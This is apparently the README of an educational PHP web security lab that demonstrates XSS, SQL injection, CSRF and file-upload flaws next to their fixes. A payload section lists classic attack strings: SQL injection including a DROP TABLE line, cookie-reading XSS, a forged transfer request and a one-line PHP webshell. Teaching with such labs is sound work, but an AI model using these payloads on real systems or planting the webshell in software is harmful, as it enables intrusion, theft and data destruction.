# 🔐 Web Security Lab - Hacker Edition

Interactive security demonstration project showcasing web vulnerabilities and defense techniques with a premium Cyberpunk/Hacker theme.

## ✨ Features

### 🎯 **9 Interactive Demonstrations**
1. **GET vs POST** - HTTP method comparison with request interceptor
2. **Input Validation** - Server-side validation examples
3. **XSS Attack** - Cross-Site Scripting vulnerability demo
4. **Live Chat XSS** - Persistent XSS in chat system
5. **SQL Injection** - Database manipulation attacks (NEW! 💎)
6. **CSRF Attack** - Cross-Site Request Forgery with token protection (NEW! 💎)
7. **File Upload** - Webshell upload vulnerability (NEW! 💎)
8. **Final Exercise** - Complete secure registration system
9. **Presentation Slides** - Full-screen Matrix-themed slides

### 🎨 **Premium UI/UX**
- 🌟 Cyberpunk neon theme with glitch effects
- ✨ Matrix rain animation background
- 🎭 Smooth transitions and hover effects
- 💫 Interactive terminal emulator
- 📱 Fully responsive design
- 🎬 Professional presentation slides

### 🛡️ **Security Features**
- ✅ Vulnerable vs Secure mode comparison
- 📚 Ready-to-use attack payloads
- 🎓 Educational explanations
- 💡 Best practices documentation
- 🔒 Real-world defense techniques

## 🚀 Quick Start

### Installation

```bash
# Navigate to project directory
cd path/to/project

# Start PHP development server
php -S localhost:8000

# Open in browser
http://localhost:8000/dashboard.php
```

### Requirements
- PHP 7.4 or higher
- Modern web browser (Chrome, Firefox, Edge)
- No database required (uses file storage)

## 📚 Project Structure

```
Tsw/
├── dashboard.php           # 🎯 Main navigation hub
├── slides.html            # 🎬 Presentation slides
├── 01_get_post.php       # GET vs POST demo
├── 02_validation.php     # Input validation
├── 03_xss_demo.php       # XSS basics
├── 04_live_chat_xss.php  # Persistent XSS
├── 05_sql_injection.php  # SQL injection lab (NEW!)
├── 06_csrf_demo.php      # CSRF attack demo (NEW!)
├── 07_file_upload.php    # File upload vuln (NEW!)
├── assets/
│   ├── style.css         # Cyberpunk theme
│   ├── animations.css    # Advanced animations (NEW!)
│   ├── interceptor.js    # Request interceptor
│   └── terminal.js       # Interactive terminal (NEW!)
├── final/
│   ├── register.php      # Secure registration
│   └── profile.php       # User profile
└── README.md
```

## 🎓 Usage Guide

### For Presenters

1. **Start Dashboard**: Open `dashboard.php` for navigation
2. **Use Slides**: `slides.html` for full presentation
3. **Live Demos**: Click any lab for interactive demonstration
4. **Terminal**: Use terminal for quick commands and info

### For Students

1. **Explore Labs**: Try each vulnerability in safe environment
2. **Test Payloads**: Use provided attack strings
3. **Compare Modes**: Toggle between vulnerable/secure versions
4. **Learn Defenses**: Study secure code examples

## 🎯 Penetration Testing Guide

### SQL Injection Payloads
```sql
' OR '1'='1          # Authentication bypass
' UNION SELECT *     # Data extraction
'; DROP TABLE --     # Destructive attack
```

### XSS Payloads
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<style>body{background:red;}</style>
```

### CSRF Attack
```html
<img src="bank.com/transfer?amount=5000&to=hacker">
<form action="target.com/action" method="POST" id="csrf">
```

### File Upload
```php
shell.php: <?php system($_GET['cmd']); ?>
webshell.php: Full command panel
```

## 🛡️ Security Best Practices

### Input Validation
✅ Server-side validation  
✅ Whitelist approach  
✅ Type checking  
✅ Length limits

### XSS Prevention
✅ `htmlspecialchars()` for output  
✅ Content Security Policy  
✅ Input sanitization  
✅ HTTPOnly cookies

### SQL Injection Prevention
✅ Prepared statements (PDO)  
✅ ORM frameworks  
✅ Input validation  
✅ Least privilege principle

### CSRF Protection
✅ CSRF tokens  
✅ SameSite cookies  
✅ Origin header validation  
✅ Re-authentication for sensitive actions

### File Upload Security
✅ Extension whitelist  
✅ MIME type validation  
✅ File content inspection  
✅ Random filename generation  
✅ Upload outside webroot

## 🎬 Presentation Tips

### Recommended Flow (1 hour)
1. **Introduction** (5 min) - Dashboard + overview
2. **Basic Concepts** (10 min) - GET/POST, Validation
3. **XSS Demonstrations** (15 min) - Demos 3-4
4. **Advanced Attacks** (20 min) - SQL, CSRF, File Upload
5. **Defense Techniques** (8 min) - Secure implementations
6. **Q&A** (2 min)

### Pro Tips
🎤 Use terminal for visual effect  
🎨 Keep vulnerable mode for impact  
💡 Explain each payload before demo  
⚡ Use "Launch All" for quick access  
🎯 Focus on real-world scenarios

## 🏆 Key Highlights

✅ **9 Complete Labs** - Comprehensive security coverage  
✅ **15+ Attack Vectors** - Real-world scenarios  
✅ **Vulnerable + Secure** - Side-by-side comparison  
✅ **Premium Design** - Professional appearance  
✅ **Zero Dependencies** - Pure PHP & JavaScript  
✅ **Educational Focus** - Perfect for learning  
✅ **Ready to Present** - No setup required

## 📖 Learning Outcomes

After completing this lab, you will understand:
- HTTP methods and their security implications
- Input validation and sanitization techniques
- XSS attack vectors and prevention
- SQL injection mechanics and defenses
- CSRF attack methodology and tokens
- File upload vulnerabilities and protection
- Real-world security best practices

## 👨‍💻 Author

**Amin Davodian**  
Senior Full-Stack Developer & Security Researcher

- 🌐 Website: [senioramin.com](https://senioramin.com)
- 💼 LinkedIn: [linkedin.com/in/SudoAmin](https://linkedin.com/in/SudoAmin)
- 🐙 GitHub: [github.com/SeniorAminam](https://github.com/SeniorAminam)

## ⚠️ Disclaimer

This project is for **educational purposes only**. All vulnerabilities are demonstrated in a controlled environment. Do NOT use these techniques on systems you don't own or have permission to test.

## 📄 License

Developed by Amin Davodian for educational use.

---

**Made with ❤️ and☕ by Amin Davodian**

